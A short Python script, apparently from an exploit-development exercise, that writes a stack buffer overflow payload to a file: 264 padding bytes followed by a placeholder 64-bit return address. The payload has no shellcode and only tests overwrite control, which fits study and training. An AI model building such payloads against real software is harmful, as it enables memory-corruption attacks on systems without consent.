#!/usr/bin/env python
from struct import *

buffer =''
buffer += 'A' * 264
buffer += pack("<Q", 0x434343434343)
f=open("finalexam.txt", "w")
f.write(buffer)
